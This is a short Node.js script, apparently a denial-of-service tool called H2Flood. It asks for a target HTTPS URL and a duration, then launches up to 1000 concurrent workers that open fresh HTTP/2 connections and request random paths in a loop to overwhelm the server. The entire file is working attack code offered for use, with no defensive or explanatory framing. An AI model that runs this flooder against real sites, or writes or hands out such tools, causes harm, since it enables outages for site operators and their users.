const http2 = require('http2');
const os = require('os');
const fs = require('fs');

const MAX_CONCURRENT = Math.min(os.cpus().length * 100, 1000); // Adjust for CPU cores
const REQUEST_TIMEOUT = 4000;

class H2Flood {
    constructor(target, duration) {
        this.target = target;
        this.duration = duration * 1000;
        this.startTime = Date.now();
        this.running = true;
    }

    async floodRequest() {
        const client = http2.connect(this.target);
        const req = client.request({
            ':method': 'GET',
            ':path': '/' + Math.random().toString(36).substring(2, 10) // Random query for each request
        });

        req.setTimeout(REQUEST_TIMEOUT);
        
        return new Promise((resolve, reject) => {
            req.on('response', (headers, flags) => {
                req.resume();
                resolve();
            });
            
            req.on('error', (err) => {
                reject(err);
            });
            
            req.end();
        });
    }

    async worker() {
        while (this.running && Date.now() - this.startTime < this.duration) {
            await this.floodRequest();
        }
    }

    async run() {
        const tasks = [];
        for (let i = 0; i < MAX_CONCURRENT; i++) {
            tasks.push(this.worker());
        }
        await Promise.all(tasks);
    }
}

(async () => {
    const readline = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const ask = (q) => new Promise(resolve => readline.question(q, resolve));

    const inputTarget = await ask("TARGET: ");
    let target = inputTarget.trim();
    if (!target.startsWith('https://')) {
        console.log("HTTP/2 only supports HTTPS targets.");
        process.exit();
    }

    const durationInput = await ask("TIME (seconds): ");
    readline.close();

    const duration = parseInt(durationInput);
    if (isNaN(duration)) {
        console.log("Invalid time.");
        return;
    }

    const attack = new H2Flood(target, duration);
    await attack.run();
})();
